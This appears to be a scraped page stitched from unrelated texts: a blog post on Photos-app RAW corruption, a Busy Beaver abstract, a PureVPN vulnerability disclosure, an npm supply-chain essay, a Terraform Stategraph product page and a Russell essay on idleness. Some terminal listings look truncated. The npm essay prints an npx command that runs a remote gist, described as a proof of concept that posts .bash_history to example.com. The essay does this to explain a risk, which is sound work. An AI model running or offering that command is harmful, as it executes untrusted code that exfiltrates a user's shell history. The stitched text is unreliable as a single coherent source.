<p>Losing so many photos really rattled me, but I wanted to figure out the problem so I didn’t lose images in the future.</p>
<h2 id="narrowing-down-the-problem">Narrowing down the problem</h2>
<p>I was worried this was somehow a hardware problem.
Copying files seems so basic, I didn’t think there was any way a massively deployed app like Photos could fuck it up (especially since its main job is managing photo files).
So, to narrow down the issue I changed out all of the hardware.
Here are all the things I did:</p>
<ul>
<li>Switched USB-C cables</li>
<li>Bought a new SD card direct from the manufacturer (to eliminate the possibility of buying a bootleg SD card)</li>
<li>Switched to only shooting in RAW (if importing messes up 30% of my images, but I cut the number of images I import by half, then that should be fewer corrupted images right? lol)</li>
<li>Bought a new laptop</li>
<li>Bought a new camera: the OM System OM-1 MKii</li>
</ul>
<p>I did each of these steps over time, as to only change one variable at a time, and still the image corruption persisted.
I didn’t really want to buy a new camera, the MKii is not really a big improvement over the OM-1, but we had a family trip coming up and the idea that pressing the shutter button on the camera might not actually record the image didn’t sit well with me.</p>
<h2 id="finally-a-smoking-gun">Finally a smoking gun</h2>
<p>Since I had replaced literally all of the hardware involved, I knew it must be a software problem.
I stopped checking the “delete after import” button, and started reviewing all of the photos after import.
After verifying none of them were corrupt, then I would format the SD card.
I did this for months without finding any corrupt files.
At this point I figured it was somehow a race condition or something when copying the photo files and deleting them at the same time.</p>
<p>However, after I got home from RailsConf and imported my photos, I found one corrupt image (the one above).
I was able to verify that the image was <em>not</em> corrupt on the SD card, so the camera was working fine (meaning I probably didn’t need to buy a new camera body at all).</p>
<p>I tried deleting the corrupt file and re-importing the original to see if it was something about that particular image, but it re-imported just fine.
In other words, it seems like the Photos app will corrupt files randomly.</p>
<p>I don’t know if this is a problem that is specific to OM System cameras, and I’m not particularly interested in investing in a new camera system just to find out.</p>
<p>If I compare the corrupted image with the non-corrupted image, the file sizes are exactly the same, but the bytes are different:</p>
<p>Checksums:</p>
<pre tabindex="0"><code>aaron@tc ~/Downloads&gt; md5sum P7110136-from-camera.ORF Exports/P7110136.ORF 
17ce895fd809a43bad1fe8832c811848  P7110136-from-camera.ORF

</code></pre><p>File sizes:</p>
<pre tabindex="0"><code>aaron@tc ~/Downloads&gt; ls -al P7110136-from-camera.ORF Exports/P7110136.ORF

-rwx------  1 aaron  staff  18673943 Jul 17 09:29 P7110136-from-camera.ORF*
</code></pre><p>The <code>P7110136-from-camera.ORF</code> is the non-corrupted file, and <code>Exports/P7110136.ORF</code> is the corrupted file from Photos app.
Here’s a screenshot of the preview of the non-corrupted photo:</p>
<p><img src="https://tenderlovemaking.com/images/non-corrupt.png" alt="screenshot of non-corrupt image"></p>
<p><a href="https://gist.github.com/tenderlove/25853f50ab46a58738ff2cc22d682f2b">Here is the binary diff between the files</a>.
I ran both files through <code>xxd</code> then diffed them.</p>
<h2 id="my-new-workflow">My new workflow</h2>
<p>I’m not going to put any more effort into debugging this problem, but I wanted to blog about it in case anyone else is seeing the issue.
I take a lot of photos, and to be frank, most of them are not very good.
I don’t want to look through a bunch of bad photos every time I look at my library, so culling photos is important.
Culling photos in the Photos app is way too cumbersome, so I’ve switched to using <a href="https://www.darktable.org/">Darktable</a>.</p>
<p>My current process is:</p>
<ul>
<li>Import images to Darktable</li>
<li>Delete the ones I don’t like</li>
<li>Process ones I do like</li>
<li>Export both the jpg and the original raw file</li>
<li>Import those to the Photos app so they’re easy to view and share</li>
<li>Periodically format my SD card</li>
</ul>
<p>I’ve not seen any file corruption when importing to Darktable, so I am convinced this is a problem with the Photos app.
But now, since all of my images land in Darktable before making their way to the Photos app, I don’t really care anymore.
The bad news is that I’ve spent a lot of time and money trying to debug this.
I guess the good news is that now I have redundant hardware!</p>

The Busy Beaver value $S(n)$ is the maximum number of steps that an $n$-state 2-symbol Turing machine can perform from the all-zero tape before halting, and $S$ was historically introduced by Tibor Radó in 1962 as one of the simplest examples of an uncomputable function. The proof enumerates $181,385,789$ Turing machines with 5 states and, for each machine, decides whether it halts or not. Our result marks the first determination of a new Busy Beaver value in over 40 years and the first Busy Beaver value ever to be formally verified, attesting to the effectiveness of massively collaborative online research (bbchallenge$.$org).

<div id="readability-page-1" class="page"><article>
            
            
            <div>
                <p>In late August 2025, I submitted two security reports to PureVPN under their VDP. Three weeks later, I’ve received no response, so I decided to publish the findings to inform other users.</p>
<p>The issues affect both their GUI (v2.10.0) and CLI (v2.0.1) clients on Linux (tested on Ubuntu 24.04.3 LTS, kernel 6.8.0, iptables-nft backend). Here’s what I found.</p>
<h2 id="1-ipv6-leaks-off-tunnel">1. IPv6 Leaks Off-Tunnel</h2>
<p>After toggling Wi-Fi or resuming from suspend, the PureVPN client fails to restore IPv6 protections:</p>
<ul>
<li>
<p><strong>CLI (IKS enabled)</strong>: The client auto-reconnects and reports status as “connected”, yet the system regains a default IPv6 route via Router Advertisements (<code>fe80::1</code>). Since <code>ip6tables</code> <code>OUTPUT</code> remains <code>ACCEPT</code> (default), egress resumes off-tunnel.
</p><p>
      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/HDqoD2SaCKA?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" title="YouTube video"></iframe>
    </p>

</li>
<li>
<p><strong>GUI (IKS enabled)</strong>: When the GUI detects a disconnection, it blocks IPv4 and displays the “VPN session disconnected” dialog. However, IPv6 remains functional until the user explicitly clicks <code>Reconnect</code>.
</p><p>
      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/jjCsTt4y2JM?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" title="YouTube video"></iframe>
    </p>

</li>
</ul>
<p>Real-world effect: I was able to browse IPv6-preferred sites and send/receive email (Thunderbird) with my ISP’s IPv6 address while the client UI claimed I was protected.</p>
<h2 id="2-host-firewall-reset-and-not-restored">2. Host Firewall Reset and Not Restored</h2>
<p>At connect time, PureVPN wipes the user’s <code>iptables</code> configuration:</p>
<ul>
<li><code>INPUT</code> is set to <code>ACCEPT</code></li>
<li>All <code>-A</code> rules are flushed (UFW, Docker jumps, user rules, etc.)</li>
<li>After disconnect, these changes are not reverted</li>
</ul>
<p>Result: the system remains more exposed after using the VPN than before. This defeats the point of using UFW or a local deny policy and contradicts user expectations.</p>
<p>Example:</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span><span># Baseline protections</span>
</span></span><span><span>$ sudo iptables -P INPUT DROP
</span></span><span><span>$ sudo iptables -I INPUT -p icmp -j DROP
</span></span><span><span>
</span></span><span><span><span># Connect to VPN</span>
</span></span><span><span>$ purevpn-cli -c US
</span></span><span><span>$ sudo iptables -S <span>|</span> head -3
</span></span><span><span>-P INPUT ACCEPT
</span></span><span><span>-P FORWARD DROP
</span></span><span><span>-P OUTPUT ACCEPT
</span></span><span><span>$ sudo iptables -S <span>|</span> grep icmp
</span></span><span><span><span># (no output — rule was wiped)</span>
</span></span><span><span>
</span></span><span><span><span># Disconnect</span>
</span></span><span><span>$ purevpn-cli -d
</span></span><span><span>$ sudo iptables -S <span>|</span> head -3
</span></span><span><span>-P INPUT ACCEPT
</span></span><span><span>-P FORWARD DROP
</span></span><span><span>-P OUTPUT ACCEPT
</span></span><span><span><span># All wiped. INPUT = ACCEPT</span>
</span></span></code></pre></div><h2 id="tldr">TL;DR</h2>
<p>PureVPN:</p>
<ul>
<li>Does not properly implement an IPv6 kill-switch</li>
<li>Leaves IPv6 egress open after reconnects or IKS events</li>
<li>Wipes your firewall state (<code>iptables</code>) and does not restore it</li>
<li>Applies broad <code>ACCEPT</code> policies to make things work</li>
</ul>
<p>Both issues have real-world impact. Privacy claims are undermined when your real IPv6 leaks and your firewall state is lost.</p>
<p>I submitted full technical reports and screencasts to <a href="mailto:security@purevpn.com">security@purevpn.com</a>. No acknowledgment to date.</p>
<p>Use with caution.</p>

But now, these supply chain attacks are starting to target more critical things like tokens and access keys of the package maintainers, as seen with the <a href="https://snyk.io/blog/weaponizing-ai-coding-agents-for-malware-in-the-nx-malicious-package/" target="_blank">NX</a>
incident and now <a href="https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised" target="_blank">several depedencies that are used daily by thousands of developers</a>
.</p><p>Again… this is <a href="https://en.wikipedia.org/wiki/Npm_left-pad_incident" target="_blank">nothing new</a>
in the land of NPM.</p><p>But it didn’t have to be this way…</p><h3 id="weve-come-along-way-but-have-travelled-nowhere">We’ve come along way, but have travelled nowhere</h3><p>I have a long history with NodeJS – around 2010 I started working on a startup, and this was <a href="https://www.slideshare.net/slideshow/techmeetup-edinburgh-nodejs-talk/5742191" target="_blank">before npm was even a thing</a>
.</p><p><img src="https://tane.dev/images/npm-before-it-was-a-thing.png" alt="A sceenshot of a slide with an announcement of npm as a package manage for node"></p><p>Back in the misty days of the 1990s most JavaScript security issues were not much of a backend concern: this was mostly the domain of Perl, PHP, Python, and Java.</p><p><em>The web however was a much different story.</em></p><p>In the very early days of the World Wide Web there was really only one main browser everyone used: Netscape Navigator. Released in 1994 it was not <em>just a browser</em>: throughout its life it had various incarnations of a built-in email client, calendar, HTML editor with FTP browser, and with plugins could play media files like Realplayer and MP3 (which I remember at its launch) and Flash movies and games. It’s where JavaScript was born.</p><p>Many of the early websites of the day were static – popular tools to build websites included <a href="https://en.wikipedia.org/wiki/HotDog" target="_blank">HotDog</a>
or <a href="https://en.wikipedia.org/wiki/Windows_Notepad" target="_blank">Notepad</a>
. No fancy IDEs or frameworks, just a text editor, a browser, and <code>alert()</code> to debug.</p><blockquote><p>Microsoft had also entered the game with Internet Explorer – included in an early Windows DLC called “Plus! For Windows 95”. It eventually became the software that Microsoft bet its whole company strategy around (much like today with AI).</p></blockquote><p>Internet Explorer was embedded into every aspect of Windows – first in 1995 with Active Desktop, which continued all the way to Windows XP. With it you could embed a frame item on your Desktop, but also a Rich Text document or Excel spreadsheet. It was also bloated and buggy – and with that it presented two problems: a massive security risk and exposure to accusations of monopolising the browser market.</p><blockquote><p>The law came after Microsoft hard and in 2001 it won – Microsoft was told to break up its monopoly. One aspect was that it had to offer other browsers on its operating system (a similar story happening now to Apple) – but it also wasn’t forced to <strong>remove</strong> Internet Explorer.</p></blockquote><p>Microsoft essentially <em>abandoned</em> IE; as the years rolled on they continued to push out new major verions to capture the market, but without fixing the major flaws. It still shipped as default with the OS, unable to be removed without breaking other parts of the system.</p><p>Each release of Internet Explorer added something new to the browser landscape, but it also continued to add bugs and flaws on top of the ones that no one touched – by default, on all Windows systems lived code that could <a href="https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-012?redirectedfrom=MSDN" target="_blank">give hijackers access to users machines</a>
.</p><blockquote><p>It wasn’t until 2015 they finally abandoned the existing Internet Explorer codebase and shifted to a new engine before eventually settling on their <del>Chome</del>Blink-based engine. However the ghost of IE <a href="https://www.forbes.com/sites/zakdoffman/2024/07/11/microsoft-warning-21-days-to-update-or-stop-using-windows/" target="_blank">still haunts us today</a>
.</p></blockquote><h3 id="the-ticking-time-bomb-of-postinstall">The ticking time-bomb of postinstall</h3><p>8 years ago, I wrote a small <a href="https://github.com/tanepiper/steal-ur-stuff" target="_blank">proof of concept</a>
. It was in response to <a href="https://github.com/npm/npm/issues/17724" target="_blank">this issue</a>
about <code>npx</code> – a small tool that had just been added to <code>npm</code> by default whether you liked it or not.</p><p>With <code>npx</code> you could now run the following arbitary command (PLEASE DO NOT RUN THIS SCRIPT):</p><pre tabindex="0"><code>npx https://gist.github.com/tanepiper/6cb9067adca626cd2c0edbc3786dad7b
</code></pre><p>This would now pull the gist as a node module and run it. In the proof-of-concept I put this command as a <code>postinstall</code> script. If you look at the gist, it’s a small binary script that posts your <code>.bash_history</code> to example.com – which at the time <code>npx</code> would just run.</p><p>My frustration at the time was aimed mostly towards <code>npx</code> itself – it seemed like the NPM team were adding a new easy-to-use attack vector by shipping a tool that could run <em>any module from any source on the web, on your machine without user interaction</em>. But little did I know at the time there was a deeper problem lurking with <code>postinstall</code>.</p><blockquote><p>At the time I also created a <a href="https://github.com/tanepiper/npm-lint" target="_blank">package.json linter</a>
that would warn of potential issues. But of course it required projects to opt in, it needed trust, and I didn’t see a way forward for it.</p></blockquote><p>This was, of course, <em>before</em> Microsoft, via GitHub, owned NPM.</p><h3 id="a-short-bit-of-history">A short bit of history</h3><p>So how did NPM become the main package manager for Node? Back then, it solved a problem – it was as simple as that – and people noticed it and adopted it. Over time, more useful little libraries showed up and from that, the rest is history.</p><p>NPM, built on CouchDB which enabled fast replication, allowed a flourishing and open JavaScript ecosystem. In the beginning, it was a bit of a wild west, where people tended to cut corners or miss steps. There was also a lot of early abandonment of libraries, and communities started to form around some of the larger ones to at least establish them as de facto tools – Express.js for example has been around since before <code>npm</code> (and for all the complaints about performance aimed at it: it’s highly battle tested and the worst bugs have likely been squashed).</p><p>Node and npm’s future was not a guaranteed thing. At some point, there was fragmentation of the ecosystem – tools such as <code>yarn</code> and <code>pnpm</code> exist because <code>npm</code> couldn’t or wouldn’t fix something, but they introduced their own changes that only made them partially compatible with each other. In 2014, for a short while we even had a fork of NodeJS called <code>io-js</code> because of fundamental disagreements.</p><p>There was also the small problem that all of this infrastructure and services cost money to run.</p><blockquote><p>To paraphrase <a href="https://blog.ceejbot.com/" target="_blank"><em>C J Silverio</em></a>
– “There’s no money in package managers.”</p></blockquote><p>In 2018 Microsoft bought GitHub (and until this year ran it as a side-concern with its own CEO and management team – just last month, the CEO stepped down and now GitHub is part of the “AI” team). In 2020, GitHub bought NPM – with pockets deep enough to run the infrastructure. This means that Microsoft owns the world’s largest repository of JavaScript code, the distribution channel for its packages – and the development ecosystem with VSCode.</p><p>This likely saved <code>npm</code> in the long run by them simply having the resources to do so.</p><p>On the other hand, they have done little to make it a more secure tool, especially for enterprise customers. To their credit, GitHub has provided <a href="https://www.infoq.com/news/2024/05/github-dependabot-supply-chain/" target="_blank">new tools for Software Bill of Materials Attestastion</a>
, which is a step in the right direction. But right now there are still no signed dependencies and nothing stopping people using AI agents, or just plain old scripts, from creating thousands of junk or namesquatting repositories.</p><p>… and as we’ve learned 2-Factor Authentication isn’t enough secure npm.</p><hr><h3 id="i-want-to-get-back-to-the-fun-of-building-software">I want to get back to the fun of building software</h3><p>Ultimately, I don’t think we can trust the software ecosystem provided by Microsoft anymore. It’s too fragile, brittle in the wrong places, and too open to abuse, and for most of my career I have seen the causes and effects first hand. This has made software development less fun, and more of a chore.</p><p>The tools we use to build software are not secure by default, and almost all of the time, the companies that provide them are not held to account for the security of their products.</p><p>Without a concerted effort across the industry to make the software supply chain secure by default, we will continue to see a rise in incidents – and the risks to data privacy and security will only increase. Criminal and state actors are always looking to exploit the vulnerabilities in our software; the use of AI to create more sophisticated attacks will only improve. These don’t have to be technical either – deep fakes are close enough to be used as effective social engineering tools - and it’s very easy to fake emails that seem very legitimte.</p><p>Unfortunately, Microsoft seem to be actively hostile - in their lack of attempts to shut down an active security hole that’s almost a decade old, they have left their customers are the higest levels of risk seen in computing.</p><blockquote><p>For many companies, now is the right time to start looking at the tools they use to build software, and to start asking the hard questions about the security of their software supply chain – is it putting their customers, workers, or own profits at risk?</p></blockquote></div></div>]]></description>

        <h2>Why We're Building Stategraph: Terraform State as a Distributed Systems Problem</h2>

        <section aria-labelledby="tldr-h">
            <strong id="tldr-h">TL;DR</strong>
            <div role="region" aria-label="Terminal output: TL;DR">
                    <p><span>$</span> cat why-stategraph.tldr</p>
                    <p>• Terraform state shows distributed coordination issues but uses file primitives.</p>
                    <p>• File blob (100% read/lock) vs. change cone (~3%).</p>
                    <p>• Stategraph → graph state, ACID transactions, subgraph isolation.</p>
                </div>
        </section>

        <p>The Terraform ecosystem has spent a decade working around a fundamental architectural mismatch: we're using filesystem semantics to solve a distributed systems problem. The result is predictable and painful.</p>

        <p>When we started building infrastructure automation at scale, we discovered that Terraform's state management exhibits all the classic symptoms of impedance mismatch between data representation and access patterns. Teams implement increasingly elaborate workarounds: state file splitting, wrapper orchestration, external locking mechanisms. These aren't solutions; they're evidence that we're solving the wrong problem.</p>

        <p>Stategraph addresses this by treating state for what it actually is: a directed acyclic graph of resources with partial update semantics, not a monolithic document.</p>

        <div>
            <h2>The Pathology of File-Based State</h2>

            <p>Terraform state, at its core, is a coordination problem. Multiple actors (engineers, CI systems, drift detection) need to read and modify overlapping subsets of infrastructure state concurrently. This is a well-studied problem in distributed systems, with established solutions around fine-grained locking, multi-version concurrency control, and transaction isolation.</p>

            <p>Instead, Terraform implements the simplest possible solution: a global mutex on a JSON file.</p>

            <div>
                <h4>Observation</h4>
                <p>The probability of lock contention in a shared state file increases super-linearly with both team size and resource count. At 100 resources and 5 engineers, you're coordinating 500 potential interaction points through a single mutex.</p>
            </div>

            <p>Consider the actual data access patterns in a typical Terraform operation:</p>

            <div role="img" aria-label="Comparison of file-based state with global lock versus graph state with precise operations">
                <div role="group" aria-labelledby="current-model">
                    <h4 id="current-model">Current Model</h4>
                    <p>
                        tfstate.json (2.3MB)
                    </p>
                    <p>
                        Read: 100%<br>Lock: 100%<br>Modify: 0.5%
                    </p>
                </div>
                <div role="group" aria-labelledby="actual-need">
                    <h4 id="actual-need">Actual Requirement</h4>
                    <div>
                        <p>VPC</p>
                        <p>Subnet</p>
                        <p>RDS</p>
                        <p>ALB</p>
                        <p>ASG</p>
                        <p>SG</p>
                    </div>
                    <p>
                        Read: 3%<br>Lock: 3%<br>Modify: 3%
                    </p>
                </div>
            </div>

            <p>This mismatch between granularity of operation and granularity of locking is the root cause of every Terraform scaling problem. It violates the fundamental principle of isolation in concurrent systems: non-overlapping operations should not block each other.</p>

            <p>The standard response, splitting state files, doesn't solve the problem. It redistributes it. Now you have N coordination problems instead of one, plus the additional complexity of managing cross-state dependencies. You've traded false contention for distributed transaction coordination, which is arguably worse.</p>
        </div>

        <div>
            <h2>State as a Graph: The Natural Representation</h2>

            <p>Infrastructure state is inherently a directed graph. Resources have dependencies, which form edges. Changes propagate along these edges. Terraform already knows this: the internal representation is a graph, and the planner performs graph traversal. But at the storage layer, we flatten this rich structure into a blob.</p>

            <p>This is akin to storing a B-tree in a CSV file. You can do it, but you're destroying the very properties that make the data structure useful.</p>

            <div role="region" aria-label="Stategraph query demo">
                    <p><span>stategraph&gt;</span> -- Find resource subgraph for planned change</p>
                    <p>WITH RECURSIVE affected AS (</p>
                    <p>    SELECT id, type, name FROM resources</p>
                    <p>    WHERE name = 'prod-api-cluster'</p>
                    <p>    UNION</p>
                    <p>    SELECT r.id, r.type, r.name FROM resources r</p>
                    <p>    JOIN dependencies d ON r.id = d.dependent_id</p>
                    <p>    JOIN affected a ON d.resource_id = a.id</p>
                    <p>) SELECT * FROM affected;</p>
                    <p>→ 12 resources in change scope <span>(0.003s)</span></p>
                    <p>→ Compared to: 2,847 resources in full state <span>(1.2s)</span></p>
                </div>

            <p>When state is properly normalized into a graph database, several properties emerge naturally:</p>

            <p><strong>Subgraph isolation:</strong> Operations on disjoint subgraphs are inherently parallelizable. If Team A is modifying RDS instances and Team B is updating CloudFront distributions, there's no shared state to coordinate.</p>

            <p><strong>Precise locking:</strong> We can implement row-level locking on resources and edge-level locking on dependencies. Lock acquisition follows the dependency graph, preventing deadlocks through consistent ordering.</p>

            <p><strong>Incremental refresh:</strong> Given a change set, we can compute the minimal refresh set by traversing the dependency graph. Most changes affect a small cone of resources, not the entire state space.</p>
        </div>

        <div>
            <h2>Concurrency Control Through Proper Abstractions</h2>

            <p>The distributed systems community solved these problems decades ago. Multi-version concurrency control (MVCC) allows readers to proceed without blocking writers. Write-ahead logging provides durability without sacrificing performance. Transaction isolation levels let operators choose their consistency guarantees.</p>

            <p>Stategraph implements these patterns at the Terraform state layer:</p>

            <div>
                <h4>Traditional: Global Lock</h4>
                
                <p><span>$ terraform apply</span> Acquiring <strong>global lock</strong>… <span>waiting</span></p>
                <h4>Stategraph: Subgraph Isolation</h4>
                
                <p><span>$ stategraph apply</span> Locking subgraph <strong>(3 resources)</strong>… <span>ready</span></p>
            </div>

            <p>Each operation acquires locks only on its subgraph. The lock manager uses the dependency graph to ensure consistent ordering, preventing deadlocks. Readers use MVCC to access consistent snapshots without blocking writers.</p>

            <div>
                <h4>Implementation Detail</h4>
                <p>Lock acquisition follows a strict partial order derived from the resource dependency graph. Resources are locked in topological order, with ties broken by resource ID. This guarantees deadlock freedom without requiring global coordination.</p>
            </div>

            <p>The result is dramatic improvement in concurrent throughput:</p>

            <div>
                <div>
                    <h5>Transaction A</h5>
                    <p>Lock: RDS:prod-db</p>
                    <p>Lock: SG:prod-db-sg</p>
                    <p>Apply changes</p>
                </div>
                <div>
                    <h5>Transaction B</h5>
                    <p>Lock: CF:cdn-dist</p>
                    <p>Lock: S3:static-assets</p>
                    <p>Apply changes</p>
                </div>
                <div>
                    <h5>Transaction C</h5>
                    <p>Lock: ASG:workers</p>
                    <p>Lock: LC:worker-config</p>
                    <p>Apply changes</p>
                </div>
            </div>

            <p>Three teams, three transactions, zero contention. This isn't possible with file-based state, regardless of how you split it.</p>
        </div>

        <div>
            <h2>The Refresh Problem</h2>

            <p>Terraform refresh is O(n) in the number of resources, regardless of change scope. Change one security group rule and you still walk the entire state. That's an algorithmic bottleneck, not just an implementation detail.</p>

            <div role="img" aria-label="Comparison of refresh scope: file-based vs graph-based">
                <div role="group" aria-labelledby="refresh-before">
                    <h4 id="refresh-before">File-Based State</h4>
                    
                    <p>
                        Changing 1 resource<br>
                        <strong>Refreshing all 30</strong>
                    </p>
                </div>
                <p>
                    →
                </p>
                <div role="group" aria-labelledby="refresh-after">
                    <h4 id="refresh-after">Graph State</h4>
                    
                    <p>
                        Changing 1 resource<br>
                        <strong>Refreshing only 3</strong>
                    </p>
                </div>
            </div>

            <p>With a graph representation, refresh work can be scoped to the affected subgraph instead of the entire state. Most changes touch only a small fraction of resources, not everything.</p>
        </div>

        <div>
            <h2>Why We Built This</h2>

            <p>At Terrateam, we've watched hundreds of teams struggle with the same fundamental problems. They start with a single state file, hit scaling limits, split their state, discover coordination complexity, build orchestration layers, and eventually resign themselves to living with the pain.</p>

            <p>This is a solvable problem. The computer science is well-understood. The implementation is straightforward once you acknowledge that state management is a distributed systems problem, not a file storage problem.</p>

            <p>Stategraph isn't revolutionary. It's the application of established distributed systems principles to a problem that's been mischaracterized since its inception. We're not inventing new algorithms; we're applying the right ones.</p>

            <div>
                <h4>Design Principle</h4>
                <p>The storage layer should match the access patterns. Terraform state exhibits graph traversal patterns, partial update patterns, and concurrent access patterns. The storage layer should be a graph database with ACID transactions and fine-grained locking. Anything else is impedance mismatch.</p>
            </div>

            <p>The infrastructure industry has accepted file-based state as an immutable constraint for too long. It's not. It's a choice, and it's the wrong one for systems at scale.</p>
        </div>

        <div>
            <h2>Technical Implementation</h2>

            <p>Stategraph is implemented as a PostgreSQL schema with a backend that speaks the Terraform/OpenTofu remote backend protocol. We chose PostgreSQL for its robust MVCC, proven scalability, and operational familiarity. The schema normalizes state into three primary relations:</p>

            <p><strong>resources:</strong> one row per resource, with type, provider, and attribute columns.<br>
            <strong>dependencies:</strong> edge table representing the resource dependency graph.<br>
            <strong>transactions:</strong> append-only log of all state mutations with full attribution.</p>

            <p>The backend extends Terraform's protocol with graph-aware operations. Lock acquisition and state queries operate directly on the database representation of the graph, enabling precision and concurrency that file-based backends can't provide.</p>

            <p>This isn't a wrapper or an orchestrator. It's a replacement for the storage layer that preserves Terraform's execution model while fixing its coordination problems.</p>
        </div>

        <div>
            <h2>Adoption Path</h2>

            <p>Stategraph reads existing tfstate files and constructs the graph representation automatically. No changes to Terraform configurations are required. The backend protocol is unchanged. From Terraform's perspective, Stategraph is just another backend, like S3 or GCS.</p>

            <p>But from an operational perspective, everything changes. Lock contention disappears. Refresh times drop by orders of magnitude. Teams stop blocking each other. State becomes queryable, auditable, and comprehensible.</p>

            <p>We're not asking teams to rewrite their infrastructure. We're asking them to store it properly.</p>

            <blockquote>
                The question isn't whether Terraform state should be a graph. It already is. The question is whether we'll continue pretending it's a file.
            </blockquote>
        </div>

        <div>
            <h3>Technical Preview</h3>
            <p>Stategraph is in active development. We're working with design partners to validate the approach at scale.</p>

<div id="readability-page-1" class="page"><div id="non-paywall">
                    <p>Like most of my generation, I was brought up on the saying “Satan finds some mischief still for idle hands to do.” Being a highly virtuous child, I believed all that I was told and acquired a conscience which has kept me working hard down to the present moment. But although my conscience has controlled my <em>actions,</em> my <em>opinions</em> have undergone a revolution. I think that there is far too much work done in the world, that immense harm is caused by the belief that work is virtuous, and that what needs to be preached in modern industrial countries is quite different from what always has been preached. Every one knows the story of the traveler in Naples who saw twelve beggars lying in the sun (it was before the days of Mussolini), and offered a lira to the laziest of them. Eleven of them jumped up to claim it, so he gave it to the twelfth. This traveler was on the right lines. But in countries which do not enjoy Mediterranean sunshine idleness is more difficult, and a great public propaganda will be required to inaugurate it. I hope that after reading the following pages the leaders of the Y.&nbsp;M.&nbsp;C.&nbsp;A. will start a campaign to induce good young men to do nothing. If so, I shall not have lived in vain.</p>
<p>Before advancing my own arguments for laziness, I must dispose of one which I cannot accept. Whenever a person who already has enough to live on proposes to engage in some everyday kind of job, such as school-teaching or typing, he or she is told that such conduct takes the bread out of other people’s mouths, and is, therefore, wicked. If this argument were valid, it would only be necessary for us all to be idle in order that we should all have our mouths full of bread. What people who say such things forget is that what a man earns he usually spends, and in spending he gives employment. As long as a man spends his income he puts just as much bread into people’s mouths in spending as he takes out of other people’s mouths in earning. The real villain, from this point of view, is the man who saves. If he merely puts his savings in a stocking, like the proverbial French peasant, it is obvious that they do not give employment. If he invests his savings the matter is less obvious, and different cases arise.</p>
<p>One of the commonest things to do with savings is to lend them to some government. In view of the fact that the bulk of the expenditure of most civilized governments consists in payments for past wars and preparation for future wars, the man who lends his money to a government is in the same position as the bad men in Shakespeare who hire murderers. The net result of the man’s economical habits is to increase the armed forces of the State to which he lends his savings. Obviously it would be better if he spent the money, even if he spent it on drink or gambling.</p>
<p>But, I shall be told, the case is quite different when savings are invested in industrial enterprises. When such enterprises succeed and produce something useful this may be conceded. In these days, however, no one will deny that most enterprises fail. That means that a large amount of human labor, which might have been devoted to producing something which could be enjoyed, was expended on producing machines which, when produced, lay idle and did no good to anyone. The man who invests his savings in a concern that goes bankrupt is, therefore, injuring others as well as himself. If he spent his money, say, in giving parties for his friends, they (we may hope) would get pleasure, and so would all those on whom he spent money, such as the butcher, the baker, and the bootlegger. But if he spends it (let us say) upon laying down rails for surface cars in some place where surface cars turn out to be not wanted, he has diverted a mass of labor into channels where it gives pleasure to no one. Nevertheless, when he becomes poor through the failure of his investment he will be regarded as a victim of undeserved misfortune, whereas the gay spendthrift, who has spent his money philanthropically, will be despised as a fool and a frivolous person.</p>
<p>All this is only preliminary. I want to say, in all seriousness, that a great deal of harm is being done in the modern world by the belief in the virtuousness of <em>work,</em> and that the road to happiness and prosperity lies in an organized diminution of work.</p>
<p>First of all: what is work? Work is of two kinds: first, altering the position of matter at or near the earth’s surface relatively to other such matter; second, telling other people to do so. The first kind is unpleasant and ill paid; the second is pleasant and highly paid. The second kind is capable of indefinite extension: there are not only those who give orders but those who give advice as to what orders should be given. Usually two opposite kinds of advice are given simultaneously by two different bodies of men; this is called politics. The skill required for this kind of work is not knowledge of the subjects as to which advice is given, but knowledge of the art of persuasive speaking and writing, <em>i.e.</em> of advertising.</p>
<p>Throughout Europe, though not in America, there is a third class of men, more respected than either of the classes of workers. These are men who, through ownership of land, are able to make others pay for the privilege of being allowed to exist and to work. These landowners are idle, and I might, therefore, be expected to praise them. Unfortunately, their idleness is rendered possible only by the industry of others; indeed their desire for comfortable idleness is historically the source of the whole gospel of work. The last thing they have ever wished is that others should follow their example.</p>
<p>From the beginning of civilization until the industrial revolution a man could, as a rule, produce by hard work little more than was required for the subsistence of himself and his family, although his wife worked at least as hard and his children added their labor as soon as they were old enough to do so. The small surplus above bare necessaries was not left to those who produced it, but was appropriated by priests and warriors. In times of famine there was no surplus; the warriors and priests, however, still secured as much as at other times, with the result that many of the workers died of hunger. This system persisted in Russia until 1917, and still persists in the East; in England, in spite of the Industrial Revolution, it remained in full force throughout the Napoleonic wars, and until a hundred years ago, when the new class of manufacturers acquired power. In America the system came to an end with the Revolution, except in the South, where it persisted until the Civil War. A system which lasted so long and ended so recently has naturally left a profound impression upon men’s thoughts and opinions. Much that we take for granted about the desirability of work is derived from this system and, being pre-industrial, is not adapted to the modern world. Modern technic has made it possible for leisure, within limits, to be not the prerogative of small privileged classes, but a right evenly distributed throughout the community. The morality of work is the morality of slaves, and the modern world has no need of slavery.</p>
<p>It is obvious that, in primitive communities, peasants, left to themselves, would not have parted with the slender surplus upon which the warriors and priests subsisted, but would have either produced less or consumed more. At first sheer force compelled them to produce and part with the surplus. Gradually, however, it was found possible to induce many of them to accept an ethic according to which it was their duty to work hard, although part of their work went to support others in idleness. By this means the amount of compulsion required was lessened, and the expenses were diminished. To this day ninety-nine per cent of British wage-earners would be genuinely shocked if it were proposed that the King should not have a larger income than a working man. The conception of duty, speaking historically, has been a means used by the holders of power to induce others to live for the interests of their masters rather than their own. Of course the holders of power conceal this fact from themselves by managing to believe that their interests are identical with the larger interests of humanity. Sometimes this is true; Athenian slave-owners, for instance, employed part of their leisure in making a permanent contribution to civilization which would have been impossible under a just economic system. Leisure is essential to civilization, and in former times leisure for the few was rendered possible only by the labors of the many. But their labors were valuable, not because work is good, but because leisure is good. And with modern technic it would be possible to distribute leisure justly without injury to civilization.</p>
